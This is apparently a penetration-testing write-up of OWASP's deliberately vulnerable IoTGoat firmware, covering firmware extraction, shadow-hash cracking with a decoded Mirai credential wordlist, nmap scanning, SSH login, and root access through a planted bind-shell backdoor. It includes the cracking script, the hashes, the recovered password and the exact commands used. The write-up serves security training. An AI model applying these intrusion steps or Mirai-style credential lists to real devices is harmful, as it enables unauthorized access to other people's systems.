# IoTGoat Writeup — From firmware extraction to root escalation

## Introduction

[IoTGoat](https://github.com/OWASP/IoTGoat) It is a deliberately vulnerable firmware based on OpenWrt, maintained by OWASP for practicing challenges from the **OWASP IoT Top 10**. In this write-up, I document the entire process I followed: from static firmware analysis to obtaining a root shell on the device, including credential cracking and the discovery of a hardcoded backdoor.

**Tools used**: `binwalk`, `john the ripper`, `nmap`, `netcat`, VirtualBox.

**Covered OWASP IoT Top 10 categories**: I1 (Weak, Guessable, or Hardcoded Passwords), I5 (Use of Insecure or Outdated Components).

---

## 1. Static firmware analysis

I downloaded the official IoTGoat release for Raspberry Pi 2 from the [release repository](https://github.com/OWASP/IoTGoat/releases):

```bash
wget https://github.com/OWASP/IoTGoat/releases/download/v1.0/IoTGoat-raspberry-pi2.img
```

Using `binwalk`, I identified the internal structure of the image:

```bash
binwalk IoTGoat-raspberry-pi2.img
```

Amidst a fair amount of false-positive noise (byte signatures that binwalk misinterprets as ESP32 images, YAFFS, etc.), I located the actual filesystem:

``` bash
29360128   0x1C00000   Squashfs filesystem, little endian, version 4.0, compression:xz, size: 3946402 bytes, 1333 inodes
```

Automatic extraction:

```bash
binwalk -e IoTGoat-raspberry-pi2.img
```

This generates `_IoTGoat-raspberry-pi2.img.extracted/squashfs-root/`, containing the device's complete file system, ready for offline analysis.

## 2. Credential cracking (I1 — Weak/Hardcoded Passwords)

Inside `etc/shadow`, I found two hashes in MD5 crypt format (`$1$`), a weak and outdated hashing scheme.:

```bash
root:$1$Jl7H1VOG$Wgw2F/C.nLNTC.4pwDa4H1:...
iotgoatuser:$1$79bz0K8z$Ii6Q/if83F1QodGmkb4Ah.:...
```

Generic dictionaries like `rockyou.txt` or lists of default manufacturer credentials yielded no results—which makes sense, as these are not "human" passwords or router web-interface credentials, but rather the type used by the **Mirai** malware for its IoT scans. The actual, complete list of Mirai credentials is XOR-obfuscated within the malware's leaked source code (`scanner.c`), so I wrote a small Python script to decode it and generate a targeted dictionary:

```python
import re

with open('scanner.c', 'r', errors='ignore') as f:
    content = f.read()

pattern = r'add_auth_entry\("((?:\\x[0-9A-Fa-f]{2})+)",\s*"((?:\\x[0-9A-Fa-f]{2})+)"'
matches = re.findall(pattern, content)

def decode(hexstr):
    bytes_list = re.findall(r'\\x([0-9A-Fa-f]{2})', hexstr)
    return ''.join(chr(int(b, 16) ^ 0x22) for b in bytes_list)

with open('mirai_creds_decoded.txt', 'w') as out:
    for user_hex, pass_hex in matches:
        out.write(f"{decode(user_hex)}:{decode(pass_hex)}\n")
```

With the 60 credentials decoded, I extracted only the password column and ran John:

```bash
cut -d':' -f2 mirai_creds_decoded.txt | sort -u > mirai_passwords.txt
john --wordlist=mirai_passwords.txt hash.txt
```

Result:

```
7ujMko0vizxv     (iotgoatuser)
```

## 3. Startup of the dynamic environment

The Raspberry Pi `.img` file is an ARM image and cannot run in VirtualBox (which emulates x86). For dynamic analysis (network, services, runtime), I used the artifact provided by the project itself for this purpose: **`IoTGoat-x86.vmdk`**.

VM configuration in VirtualBox:
- Type: Linux, version Linux 2.6/3.x/4.x (32-bit)
- **PAE/NX enabled** (required for booting)
- Network adapter in **Host-only** mode, shared with the Kali machine, to enable the attack between both VMs (NAT isolates them from each other)

With both VMs on the same network (`192.168.56.0/24`), I confirmed connectivity and proceeded to the reconnaissance phase.

## 4. Network recognition

```bash
sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -n -Pn -A 192.168.56.102
```

| Port | Service |
|---|---|
| 22/tcp | Dropbear SSH |
| 53/tcp | dnsmasq 2.73 |
| 80/tcp | LuCI (redirige a HTTPS) |
| 443/tcp | LuCI sobre TLS (cert autofirmado) |

SO detected: OpenWrt 19.07 (Linux 4.14).

## 5. Initial access via SSH

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa iotgoatuser@192.168.56.102
```

(The `HostKeyAlgorithms` flag is necessary because Dropbear in older firmware only offers `ssh-rsa`, which is disabled by default in modern OpenSSH clients.)

Successful login using the credential cracked in step 2. Shell access as `iotgoatuser`.

## 6. Post-exploitation enumeration and backdoor discovery (I1)

The system runs BusyBox, with a reduced syntax compared to GNU coreutils (`ps w` instead of `ps aux`, no `sudo`, no SUID binaries). Standard enumeration (SUID, capabilities, cron, sudoers) yielded no results.

Checking active processes:

```bash
ps w
```

Two processes drew attention, both running as root:

```
1671 root  668  S  /usr/bin/shellback
1685 root  1000 S  telnetd -p 65534
```

Neither of the two appeared in the initial nmap scan (a false negative caused by the aggressive `--min-rate`, confirmed later with a targeted scan). `netstat -tlnp` did show them listening on `0.0.0.0`.

Connecting directly to the `shellback` port:

```bash
nc 127.0.0.1 5515
```

```
[***]Successfully Connected to IoTGoat's Backdoor[***]
```

The message itself confirms the existence of an intentional backdoor. Within that session:

```
id
uid=0(root) gid=0(root)
```

**Root access confirmed**, without the need to crack the second hash.

Binary analysis with `strings`:

```bash
strings /usr/bin/shellback
```

The imported functions (`socket`, `bind`, `listen`, `accept`, `fork`, `dup2`, `execve`) describe a **classic C bind shell**: it listens on port 5515, and upon connection, redirects stdin/stdout/stderr to `/bin/busybox`, providing a root shell without any additional authentication.

I also checked the firewall configuration (`/etc/config/firewall`, `/etc/firewall.user`) to rule out network-level restrictions on accessing the backdoor—there were none: the LAN zone accepts all incoming traffic unfiltered.

## 7. Coutdated component — dnsmasq 2.73 (I5)

I verified the dnsmasq version via both static analysis (opkg control file) and dynamic analysis (nmap `dns-nsid` banner):

```
Version: 2.73-1
```

This version is vulnerable to several critical CVEs published in 2017.:

| CVE | Tipo | CVSS |
|---|---|---|
| CVE-2017-14491 | Heap buffer overflow (respuestas DNS) | 9.8 |
| CVE-2017-14492 | Heap buffer overflow (IPv6 RA) | Alto |
| CVE-2017-14493 | Stack buffer overflow (DHCPv6) | 9.8 |
| CVE-2017-13704 | Crash por paquete UDP oversized | Medio |

All of them allow for unauthenticated remote denial of service—and potentially arbitrary code execution—against a service running on the device under the `nobody` user. I did not develop a functional exploit for these CVEs during this practice session; the finding is documented by version and public CVE, which constitutes sufficient evidence to report it as critical severity in a real-world report.

## Attack chain summary

```bash
Firmware extraction (binwalk)
│
▼
Credential cracking — I1 (John + decoded Mirai dictionary)
│
▼
Setting up the dynamic environment (VirtualBox, host-only network)
│
▼
Network reconnaissance (nmap) → outdated dnsmasq 2.73 — I5
│
▼
Initial SSH access using cracked credentials
│
▼
Post-exploitation enumeration → backdoor discovery — I1
│
▼
Privilege escalation to root via backdoor (bind shell on port 5515)
```

## Conclusions

IoTGoat serves as an excellent exercise for practicing the end-to-end lifecycle of an IoT penetration test: firmware extraction and analysis, credential cracking using specialized (rather than generic) wordlists, setting up a dynamic testing environment, and post-exploitation enumeration on an embedded Linux system with limited tools (BusyBox). The most interesting finding was not the most "technical" one (the backdoor is discovered through basic process enumeration); this reinforces the fact that a significant part of a penetration test's value lies in methodical enumeration, not merely in exploiting complex vulnerabilities.

